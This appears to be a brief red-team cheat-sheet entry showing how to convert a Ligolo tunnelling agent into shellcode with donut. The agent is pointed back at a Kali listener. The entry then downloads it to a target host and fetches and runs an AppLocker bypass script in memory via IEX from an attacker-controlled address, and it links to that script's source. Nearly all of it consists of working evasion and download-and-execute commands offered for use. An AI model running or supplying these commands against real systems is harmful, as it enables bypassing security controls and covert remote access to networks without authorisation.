> On Kali, generate the bin file using the ligolo agent.exe:

```
sudo donut -f 1 -o ./agent.bin -a 2 -p "-connect <kali_ip>:11601 -ignore-cert" -i agent.exe
```

> Download agent.bin to target machine:

```
iwr -uri http://192.168.x.x/agent.bin -o agent.bin
```

> Download Ligolo AppLocker bypass in memory to attach the agent to our Ligolo listener:

```
(new-object system.net.webclient).downloadstring('http://192.168.x.x/Ligolo-AppLockerBypass.ps1') | IEX
```

The script can be obtained from here: https://raw.githubusercontent.com/Ezan0x/LigoloAppLockerEvasion/refs/heads/main/Ligolo-AppLockerBypass.ps1